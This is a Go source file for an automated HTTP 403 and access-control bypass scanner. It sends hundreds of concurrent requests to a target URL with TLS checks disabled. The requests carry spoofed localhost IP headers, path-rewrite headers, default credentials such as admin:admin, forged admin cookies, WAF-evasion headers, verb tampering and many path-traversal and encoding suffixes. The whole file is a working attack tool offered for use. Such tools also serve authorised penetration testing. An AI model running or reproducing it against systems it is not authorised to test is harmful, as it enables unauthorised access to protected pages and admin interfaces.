package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type BypassResult struct {
	Payload    string `json:"payload"`
	Method     string `json:"method"`
	StatusCode int    `json:"status_code"`
	Length     int    `json:"length"`
}

type Payload struct {
	Type         string
	Header       map[string]string
	Method       string
	Suffix       string
	PathOverride string
}

func main() {
	targetURL := flag.String("url", "", "Target URL (e.g., https://example.com/admin)")
	flag.Parse()

	if *targetURL == "" {
		fmt.Println(`{"error": "Target URL is required"}`)
		return
	}

	u, err := url.Parse(*targetURL)
	if err != nil {
		fmt.Printf(`{"error": "Invalid URL: %v"}`+"\n", err)
		return
	}

	domain := u.Host
	path := u.Path
	if path == "" {
		path = "/"
	}

	payloads := generatePayloads(domain, path)
	results := runBypasses(*targetURL, payloads)

	out, _ := json.Marshal(results)
	fmt.Println(string(out))
}

func generatePayloads(domain, path string) []Payload {
	var p []Payload

	// ==========================================
	// 1. HEADER BYPASSES (IP Spoofing)
	// ==========================================
	ipPayloads := []string{
		"127.0.0.1", "localhost", "0.0.0.0", "0", "127.1", "127.0.1",
		"2130706433", "0x7F000001", "0177.0000.0000.0001",
		"127.0.0.1:80", "127.0.0.1:443",
		"127.0.0.1, 68.180.194.242", "127.0.0.1, 127.0.0.1",
		"8.8.8.8", "10.0.0.1", "192.168.0.1", "10.10.10.1",
		"172.16.0.1", "192.168.1.200", "10.0.0.2",
		"::1", "0:0:0:0:0:0:0:1", "[::1]",
		"127.0.0.2", "127.0.0.3", "127.0.0.4",
	}

	headerKeys := []string{
		"X-Originally-Forwarded-For",
		"X-Originating-IP",
		"X-Originating-",
		"True-Client-IP",
		"X-WAP-Profile",
		"X-Forwarded-For",
		"X-Forwarded",
		"Forwarded-For",
		"Forwarded",
		"X-Forwarded-Host",
		"X-Remote-IP",
		"X-Remote-Addr",
		"X-Client-IP",
		"X-Host",
		"X-Custom-IP-Authorization",
		"Client-IP",
		"Cluster-Client-IP",
		"X-Real-IP",
		"X-Originating-Host",
		"Host",
		"CF-Connecting-IP",
		"X-Forwarded-For-Original",
		"X-Envoy-External-Address",
		"X-CDN-IP",
		"X-Edge-IP",
		"X-Orig-IP",
		"Proxy-Client-IP",
		"WL-Proxy-Client-IP",
	}

	for _, ip := range ipPayloads {
		for _, key := range headerKeys {
			p = append(p, Payload{Type: "Header Injection", Header: map[string]string{key: ip}, Method: "GET"})
		}
	}

	// ==========================================
	// 2. HEADER BYPASSES (Profile & Arbitrary)
	// ==========================================
	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"Profile": "http://" + domain}, Method: "GET"})
	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"X-Arbitrary": "http://" + domain}, Method: "GET"})
	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"Profile": "http://127.0.0.1"}, Method: "GET"})

	// ==========================================
	// 3. HEADER BYPASSES (Path Rewrite & Proxy)
	// ==========================================
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Original-URL": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Rewrite-URL": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Original-URI": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Request-URI": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-URI": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-URL": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-HTTP-DestinationURL": "http://" + domain + path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"Destination": "http://" + domain + path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Original-URL": path, "X-Host": domain}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Rewrite-URL": path, "X-Forwarded-For": "127.0.0.1"}, PathOverride: "/", Method: "GET"})

	// Proxy & Routing Headers
	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"X-Proxy-Url": "http://127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"Proxy": "http://127.0.0.1:8080"}, Method: "GET"})
	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"Proxy-Host": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"Proxy-Client-IP": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"WL-Proxy-Client-IP": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Original-Host": domain}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend-Server": "localhost"}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend-Host": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Forwarded-Server": domain}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend-Status": "200"}, Method: "GET"})

	// Protocol & Port Spoofing
	for _, proto := range []string{"http", "https", "http/1.1", "https/1.3", "http/2.0", "ftp", "ws", "wss"} {
		p = append(p, Payload{Type: "Protocol Spoofing", Header: map[string]string{"X-Forwarded-Proto": proto}, Method: "GET"})
		p = append(p, Payload{Type: "Protocol Spoofing", Header: map[string]string{"X-Forwarded-Scheme": proto}, Method: "GET"})
		p = append(p, Payload{Type: "Protocol Spoofing", Header: map[string]string{"X-URL-Scheme": proto}, Method: "GET"})
	}
	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "443"}, Method: "GET"})
	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "80"}, Method: "GET"})
	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "8080"}, Method: "GET"})
	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "8443"}, Method: "GET"})
	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"Front-End-Https": "on"}, Method: "GET"})
	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Proto": "https, http, http/1.1"}, Method: "GET"})

	// Specific Misc Headers
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Request-ID": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Request-Id": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Requested-With": "XMLHttpRequest"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"Via": "1.1 google"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"Via": "1.0 proxy.local"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Correlation-ID": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Referer": "http://" + domain + path}, Method: "GET"})
	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Referrer": "http://127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Origin": "http://" + domain}, Method: "GET"})

	// ==========================================
	// 3a. CONTENT-TYPE & ACCEPT MANIPULATION
	// ==========================================
	for _, ct := range []string{
		"application/json", "application/xml", "text/xml", "text/html",
		"application/x-www-form-urlencoded", "multipart/form-data; boundary=--403bypass",
		"application/xhtml+xml", "text/plain", "application/octet-stream",
		"application/x-javascript", "text/javascript", "application/graphql",
		"application/vnd.api+json", "text/csv", "application/yaml",
		"application/ld+json", "application/activity+json",
	} {
		p = append(p, Payload{Type: "Content-Type Manipulation", Header: map[string]string{"Content-Type": ct}, Method: "GET"})
		p = append(p, Payload{Type: "Accept Manipulation", Header: map[string]string{"Accept": ct}, Method: "GET"})
	}
	for _, pair := range []struct{ ct, accept string }{
		{"application/json", "application/json"},
		{"text/html", "text/html,application/xhtml+xml"},
		{"application/xml", "application/xml,text/xml"},
		{"text/plain", "*/*"},
	} {
		p = append(p, Payload{Type: "Content-Type+Accept", Header: map[string]string{"Content-Type": pair.ct, "Accept": pair.accept}, Method: "GET"})
		p = append(p, Payload{Type: "Content-Type+Accept", Header: map[string]string{"content-type": pair.ct, "accept": pair.accept}, Method: "GET"})
	}

	// ==========================================
	// 3b. AUTHENTICATION BYPASS
	// ==========================================
	authHeaders := []struct {
		hdr, val, desc string
	}{
		{"Authorization", "Basic YWRtaW46YWRtaW4=", "admin:admin"},
		{"Authorization", "Basic YWRtaW46cGFzc3dvcmQ=", "admin:password"},
		{"Authorization", "Basic Z3Vlc3Q6", "guest:blank"},
		{"Authorization", "Basic Og==", "empty:empty"},
		{"Authorization", "Bearer 1234567890abcdef", "fake bearer"},
		{"Authorization", "Bearer admin", "bearer admin"},
		{"X-API-Key", "admin", "x-api-key admin"},
		{"X-Auth-Token", "admin", "x-auth-token admin"},
		{"X-API-Key", "guest", "x-api-key guest"},
		{"X-Auth-Token", "guest", "x-auth-token guest"},
		{"Authorization", "Negotiate admin", "negotiate"},
		{"Authorization", "Digest admin", "digest"},
		{"X-Token", "admin", "x-token admin"},
		{"X-User", "admin", "x-user admin"},
		{"X-Forwarded-User", "admin", "x-forwarded-user admin"},
		{"X-UID", "0", "x-uid root"},
		{"X-User-ID", "0", "x-user-id root"},
		{"X-Api-Key", "*", "x-api-key wildcard"},
	}
	for _, a := range authHeaders {
		p = append(p, Payload{Type: "Auth Bypass [" + a.desc + "]", Header: map[string]string{a.hdr: a.val}, Method: "GET"})
	}

	// ==========================================
	// 3c. COOKIE MANIPULATION
	// ==========================================
	for _, c := range []struct{ name, val, desc string }{
		{"admin", "true", "admin=true"},
		{"admin", "1", "admin=1"},
		{"role", "admin", "role=admin"},
		{"user", "admin", "user=admin"},
		{"session", "admin", "session=admin"},
		{"auth", "true", "auth=true"},
		{"bypass", "1", "bypass=1"},
		{"is_admin", "1", "is_admin=1"},
		{"auth_level", "0", "auth_level=0"},
		{"access", "granted", "access=granted"},
	} {
		p = append(p, Payload{Type: "Cookie Injection [" + c.desc + "]", Header: map[string]string{"Cookie": c.name + "=" + c.val}, Method: "GET"})
	}

	// ==========================================
	// 3d. CORS & ORIGIN BYPASS
	// ==========================================
	for _, origin := range []string{
		"null", "https://evil.com", "http://evil.com",
		"https://attacker.com", "http://attacker.com",
		"https://" + domain, "http://" + domain,
		"https://www." + domain, "http://m." + domain,
		"http://evil." + domain, "https://" + domain + ".evil.com",
	} {
		p = append(p, Payload{Type: "CORS Origin Bypass", Header: map[string]string{"Origin": origin}, Method: "GET"})
	}
	p = append(p, Payload{Type: "CORS Headers", Header: map[string]string{"Access-Control-Request-Method": "GET", "Origin": "https://evil.com"}, Method: "OPTIONS"})
	p = append(p, Payload{Type: "CORS Headers", Header: map[string]string{"Access-Control-Request-Headers": "x-requested-with", "Origin": "https://evil.com"}, Method: "OPTIONS"})

	// ==========================================
	// 3e. WAF-SPECIFIC BYPASS HEADERS
	// ==========================================
	wafHeaders := []struct{ hdr, val, desc string }{
		{"X-Cloudflare-Client-IP", "127.0.0.1", "Cloudflare client IP"},
		{"CF-RAY", "123456", "cloudflare ray"},
		{"CF-IPCountry", "US", "cf country"},
		{"X-Cloudflare-IP", "127.0.0.1", "cloudflare ip"},
		{"CF-Worker", "127.0.0.1", "cf worker"},
		{"X-Amz-Cf-Id", "123", "cloudfront id"},
		{"X-Amzn-Trace-Id", "Root=1-123456", "x-amzn trace"},
		{"X-Amz-Website-Redirect-Location", "/", "s3 redirect"},
		{"X-Amz-Request-Id", "123", "s3 request id"},
		{"True-Client-IP", "127.0.0.1", "akamai true client"},
		{"X-Akamai-Edge", "127.0.0.1", "akamai edge"},
		{"X-Akamai-Client-IP", "127.0.0.1", "akamai client"},
		{"X-Varnish", "123456", "varnish"},
		{"X-Cache", "HIT", "cache hit"},
		{"X-Served-By", "127.0.0.1", "served by"},
		{"X-Cache-Hits", "1", "cache hits"},
		{"X-Protection-Plan", "0", "waf off"},
		{"X-Security-Token", "bypass", "sec token"},
		{"X-Security-Protocol", "1", "sec proto"},
		{"X-Block", "false", "x-block false"},
		{"X-Cisco-Ips-Signature-Id", "0", "cisco ips off"},
		{"Cisco-Test", "bypass", "cisco test"},
	}
	for _, w := range wafHeaders {
		p = append(p, Payload{Type: "WAF Bypass [" + w.desc + "]", Header: map[string]string{w.hdr: w.val}, Method: "GET"})
	}

	// ==========================================
	// 3f. RANGE & CACHE MANIPULATION
	// ==========================================
	p = append(p, Payload{Type: "Range Request", Header: map[string]string{"Range": "bytes=0-1024"}, Method: "GET"})
	p = append(p, Payload{Type: "Range Request", Header: map[string]string{"Range": "bytes=0-"}, Method: "GET"})
	p = append(p, Payload{Type: "Range Request", Header: map[string]string{"Range": "bytes=0-0"}, Method: "GET"})
	p = append(p, Payload{Type: "Range Request", Header: map[string]string{"Range": "bytes=100-200"}, Method: "GET"})
	p = append(p, Payload{Type: "Cache Bypass", Header: map[string]string{"Cache-Control": "no-cache, no-store"}, Method: "GET"})
	p = append(p, Payload{Type: "Cache Bypass", Header: map[string]string{"Pragma": "no-cache"}, Method: "GET"})
	p = append(p, Payload{Type: "Cache Bypass", Header: map[string]string{"Cache-Control": "max-age=0"}, Method: "GET"})

	// ==========================================
	// 3g. ENHANCED HEADER VARIANTS (lowercase + mixed case)
	// ==========================================
	extraHeaderKeys := []string{
		"x-forwarded-for", "x-forwarded", "x-real-ip", "x-client-ip",
		"x-originating-ip", "client-ip", "true-client-ip",
		"X-forwarded-For", "x-Forwarded-for", "X-REAL-IP",
		"x_forwarded_for", "X_FORWARDED_FOR",
	}
	for _, ip := range []string{"127.0.0.1", "localhost", "0.0.0.0"} {
		for _, key := range extraHeaderKeys {
			p = append(p, Payload{Type: "Header Variant", Header: map[string]string{key: ip}, Method: "GET"})
		}
		p = append(p, Payload{Type: "Header IP Chain", Header: map[string]string{"X-Forwarded-For": "127.0.0.1, 10.0.0.1, " + ip}, Method: "GET"})
	}

	// ==========================================
	// 3h. CONNECTION & UPGRADE HEADERS
	// ==========================================
	p = append(p, Payload{Type: "Upgrade", Header: map[string]string{"Upgrade": "h2c", "Connection": "Upgrade"}, Method: "GET"})
	p = append(p, Payload{Type: "TE", Header: map[string]string{"TE": "trailers"}, Method: "GET"})
	p = append(p, Payload{Type: "Expect", Header: map[string]string{"Expect": "100-continue"}, Method: "GET"})
	p = append(p, Payload{Type: "Sec-Fetch", Header: map[string]string{"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1"}, Method: "GET"})
	p = append(p, Payload{Type: "Sec-Fetch", Header: map[string]string{"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?0"}, Method: "GET"})
	p = append(p, Payload{Type: "Save-Data", Header: map[string]string{"Save-Data": "on"}, Method: "GET"})
	p = append(p, Payload{Type: "DNT", Header: map[string]string{"DNT": "1"}, Method: "GET"})

	// User-Agent Spoofing
	uas := []string{
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
		"curl/7.68.0",
		"Go-http-client/2.0",
		"Wget/1.21",
		"python-requests/2.31.0",
	}
	for _, ua := range uas {
		p = append(p, Payload{Type: "User-Agent Spoofing", Header: map[string]string{"User-Agent": ua}, Method: "GET"})
	}

	// ==========================================
	// 4. HTTP METHOD BYPASSES (Verb Tampering & Method Override)
	// ==========================================
	methods := []string{
		"TRACE", "POST", "PUT", "OPTIONS", "PATCH", "INVENTED", "HACK", "DELETE", "CONNECT",
		"HEAD", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
		"PURGE", "BIND", "REBIND", "UNBIND", "ACL", "REPORT", "SEARCH",
		"TRACK", "CONNECT", "SUBSCRIBE", "UNSUBSCRIBE", "NOTIFY", "POLL",
		"GET", "POST", "PUT", "DELETE", "PATCH",
	}
	for _, m := range methods {
		p = append(p, Payload{Type: "Verb Tampering", Method: m})
	}
	// lowercase methods
	for _, m := range []string{"get", "post", "put", "patch", "delete", "options", "head"} {
		p = append(p, Payload{Type: "Verb Tampering (lower)", Method: m})
	}

	// Method Override Spoofing
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "POST"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "GET"}, Method: "POST"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "PUT"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "PATCH"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method": "POST"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-Method-Override": "POST"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "TRACE"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "OPTIONS"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "INVENTED"}, Method: "GET"})

	// ==========================================
	// 5. PATH SUFFIX & URL ENCODING FUZZING
	// ==========================================
	suffixes := []string{
		"%2e/", "/.", "//", "./", "/./", "%20", "%09", "?", ".html", "/*", "/..;/",
		"~", ".json", ".xml", ".php", ".txt", "..%2f", "%2e%2e%2f", "%252e%252e%252f",
		"?", "??", "&", "#", "%", "%20/", "%00", ".swp", ".bak", "~1", ".ext",
		"//%2e%2e/", "/%20%23", "/%2e%2e", "/..%3b/", "/.;/", "/;/", "/..%00/",
		"#?", "%09%3b", "%09..", "%09;", "%23%3f", "%252f%252f", "%252f/", "%2e%2e", "%2f",
		"%2f%20%23", "%2f%23", "%2f%2f", "%2f%3b%2f", "%2f%3b%2f%2f", "%2f%3f", "%2f%3f/",
		"%2f/", "%3b", "%3b%09", "%3b%2f%2e%2e", "%3b%2f%2e%2e%2f%2e%2e%2f%2f", "%3b%2f%2e.",
		"%3b%2f..", "%3b/%2e%2e/..%2f%2f", "%3b/%2e.", "%3b/%2f%2f../", "%3b/..", "%3b//%2f../",
		"%3f%23", "%3f%3f", "..", "..%00/;", "..%00;/", "..%09", "..%0d/;", "..%0d;/", "..%5c/",
		"..%ff/;", "..%ff;/", "..;%00/", "..;%0d/", "..;%ff/", "..;\\", "..;\\;", "..\\;",
		"/%20#", "/%20%23", "/%252e%252e%252f/", "/%252e%252e%253b/", "/%252e%252f/", "/%252e%253b/",
		"/%252e/", "/%252f", "/%2e%2e", "/%2e%2e%3b/", "/%2e%2e/", "/%2e%2f/", "/%2e%3b/",
		"/%2e%3b//", "/%2e/", "/%2e//", "/%2f", "/%3b/", "/..", "/..%2f", "/..%2f..%2f",
		"/..%2f..%2f..%2f", "/../", "/../../", "/../../../", "/../../..//", "/../..//",
		"/../..//../", "/../..;/", "/.././../", "/../.;/../", "/..//", "/..//../", "/..//../../",
		"/..//..;/", "/../;/", "/../;/../", "/..;%2f", "/..;%2f..;%2f", "/..;%2f..;%2f..;%2f",
		"/..;/../", "/..;/..;/", "/..;//", "/..;//../", "/..;//..;/", "/..;/;/", "/..;/;/..;/",
		"/.//", "/.;/", "/.;//", "//..", "//../../", "//..;", "//..;", "//./", "//.;/", "///..",
		"///../", "///..//", "///..;", "///..;/", "///..;//", "//;/", "/;/", "/;//", "/;x",
		"/;x/", "/x/../", "/x/..//", "/x/../;/", "/x/..;/", "/x/..;//", "/x/..;/;/", "/x//../",
		"/x//..;/", "/x/;/../", "/x/;/..;/", ";", ";%09", ";%09..", ";%09..;", ";%09;", ";%2F..",
		";%2f%2e%2e", ";%2f%2e%2e%2f%2e%2e%2f%2f", ";%2f%2f/../", ";%2f..", ";%2f..%2f%2e%2e%2f%2f",
		";%2f..%2f..%2f%2f", ";%2f..%2f/", ";%2f..%2f/..%2f", ";%2f..%2f/../",
	}
	for _, s := range suffixes {
		p = append(p, Payload{Type: "Path Suffix Fuzzing", Method: "GET", Suffix: s})
	}

	// ==========================================
	// 6. PATH PREFIX / MID-PATH FUZZING
	// ==========================================
	if len(path) > 1 {
		pathParts := strings.Split(strings.TrimPrefix(path, "/"), "/")
		firstDir := pathParts[0]
		restPath := "/" + strings.Join(pathParts[1:], "/")
		if restPath == "/" {
			restPath = ""
		}

		prefixes := []string{
			"/%2e/", "/%ef%bc%8f/", "/./", "//", "/%20", "/%09", "/%00",
			"/..;/", "/%2e%2e%2f", "/.;/", "/;/", "/..%00/", "/..%0d/", "/..%5c/", "/..%2f/",
		}

		for _, pref := range prefixes {
			p = append(p, Payload{Type: "Path Prefix Fuzzing", Method: "GET", PathOverride: pref + firstDir + restPath})
			p = append(p, Payload{Type: "Case Toggling Fuzz", Method: "GET", PathOverride: "/" + strings.ToUpper(firstDir) + restPath})
		}
		// Also try path without first dir (double-encoding implicit)
		p = append(p, Payload{Type: "Path Prefix Double", Method: "GET", PathOverride: "/%252e/" + firstDir + restPath})
		p = append(p, Payload{Type: "Path Prefix Double", Method: "GET", PathOverride: "/%252f/" + firstDir + restPath})
	}

	return p
}

func runBypasses(target string, payloads []Payload) []BypassResult {
	var results []BypassResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	sem := make(chan struct{}, 100)

	for _, pl := range payloads {
		wg.Add(1)
		sem <- struct{}{}

		go func(pl Payload) {
			defer wg.Done()
			defer func() { <-sem }()

			reqURL := target
			if pl.PathOverride != "" {
				u, err := url.Parse(target)
				if err == nil {
					portStr := ""
					if u.Port() != "" {
						portStr = ":" + u.Port()
					}
					reqURL = fmt.Sprintf("%s://%s%s%s", u.Scheme, u.Hostname(), portStr, pl.PathOverride)
				}
			} else if pl.Suffix != "" {
				reqURL = strings.TrimSuffix(reqURL, "/") + pl.Suffix
			}

			method := pl.Method
			if method == "" {
				method = "GET"
			}

			req, err := http.NewRequest(method, reqURL, nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

			headerDesc := ""
			if pl.Header != nil {
				for k, v := range pl.Header {
					req.Header.Set(k, v)
					headerDesc += fmt.Sprintf("%s: %s ", k, v)
				}
			}

			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			desc := pl.Type
			if headerDesc != "" {
				desc += " [" + strings.TrimSpace(headerDesc) + "]"
			}
			if pl.PathOverride != "" {
				desc += " [Path: " + pl.PathOverride + "]"
			} else if pl.Suffix != "" {
				desc += " [Suffix: " + pl.Suffix + "]"
			}

			mu.Lock()
			results = append(results, BypassResult{
				Payload:    desc,
				Method:     method,
				StatusCode: resp.StatusCode,
				Length:     int(resp.ContentLength),
			})
			mu.Unlock()

		}(pl)
	}

	wg.Wait()
	return results
}
